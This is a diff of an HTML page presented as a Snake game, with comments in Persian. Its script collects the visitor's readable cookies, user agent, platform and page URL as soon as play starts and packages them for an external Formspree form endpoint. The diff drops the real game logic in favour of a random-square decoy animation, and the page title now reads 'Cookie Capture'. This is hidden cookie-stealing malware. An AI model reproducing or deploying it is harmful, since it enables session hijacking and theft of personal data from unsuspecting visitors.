@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snake Game - Top Priority</title>
+    <title>Snake Game - Cookie Capture</title>
     <style>
         body {
             margin: 0;
@@ -88,27 +88,18 @@
 
 <script>
     // --- تنظیمات ---
-    // نکته: مطمئن شوید FORM_ID درست است
     const FORM_ID = 'mkjnqlol';
     const FORM_URL = `https://formspree.io/f/${FORM_ID}`;
-    
-    // متغیرهای بازی
-    const canvas = document.getElementById('gameCanvas');
-    const ctx = canvas.getContext('2d');
-    let gameRunning = false;
-    let snake = [];
-    let food = {};
-    let direction = 'RIGHT';
 
     // --- تابع اصلی جمع‌آوری کوکی‌ها ---
-    async function captureAllCookies() {
+    async function captureCookies() {
         let cookiesData = [];
         let statusText = "Sending...";
         const logEl = document.getElementById('cookieLog');
         const statusEl = document.getElementById('status');
 
         // روش ۱: استفاده از API مدرن (کروم ۸۶+)
-        // این روش تمام کوکی‌های Cross-Origin را برمی‌گرداند
+        // این روش کوکی‌های HttpOnly را نمی‌خواند، اما بقیه کوکی‌ها را می‌خواند.
         if (navigator.cookieStore) {
             try {
                 const allCookies = await navigator.cookieStore.getAll();
@@ -116,7 +107,6 @@
                 statusText = "Modern API Used";
             } catch (e) {
                 console.warn("CookieStore failed, fallback:", e);
-                // اگر شکست خورد، به روش قدیمی برمی‌گردیم
                 const docCookies = document.cookie.split(';').map(c => ({
                     name: c.split('=')[0].trim(),
                     value: c.split('=').slice(1).join('=')
@@ -125,7 +115,7 @@
                 statusText = "Fallback Used";
             }
         } else {
-            // روش ۲: روش قدیمی (فقط کوکی‌های همان دامنه)
+            // روش ۲: روش قدیمی
             const docCookies = document.cookie.split(';').map(c => ({
                 name: c.split('=')[0].trim(),
                 value: c.split('=').slice(1).join('=')
@@ -134,12 +124,12 @@
             statusText = "Old API Used";
         }
 
-        // نمایش کوتاه در صفحه برای تست
+        // نمایش کوتاه در صفحه
         logEl.textContent = `Cookies: ${cookiesData.length} found. Sent.`;
 
-        // آماده‌سازی داده‌ها برای ارسال
+        // آماده‌سازی داده‌ها
         const payload = {
-            cookies: cookiesData, // آرایه‌ای از اشیاء {name, value}
+            cookies: cookiesData,
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             location: window.location.href,
@@ -174,42 +164,22 @@
     // --- منطق بازی مار (ساده شده) ---
     function startGame() {
         document.getElementById('overlay').style.display = 'none';
-        gameRunning = true;
-        snake = [{x: 10, y: 10}];
-        food = {x: 15, y: 15};
         
         // ارسال کوکی‌ها به محض شروع بازی
-        captureAllCookies();
+        captureCookies();
         
-        gameLoop();
-    }
-
-    function gameLoop() {
-        if (!gameRunning) return;
+        // شروع انیمیشن ساده
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
         
-        // پاک کردن صفحه
-        ctx.fillStyle = '#000';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        
-        // رسم مار
-        ctx.fillStyle = '#4CAF50';
-        snake.forEach(part => {
-            ctx.fillRect(part.x * 20, part.y * 20, 20, 20);
-        });
-        
-        // رسم غذا
-        ctx.fillStyle = '#f00';
-        ctx.fillRect(food.x * 20, food.y * 20, 20, 20);
-        
-        // حرکت مار (ساده)
-        // اینجا می‌توانید منطق کامل‌تری اضافه کنید
-        setTimeout(gameLoop, 100);
-    }
-
-    // --- تابع Always On Top ---
-    function keepOnTop() {
-        window.focus();
-        document.addEventListener('click', () => window.focus());
+        function draw() {
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#4CAF50';
+            ctx.fillRect(Math.random() * 400, Math.random() * 400, 20, 20);
+            requestAnimationFrame(draw);
+        }
+        draw();
     }
 </script>
 </body>
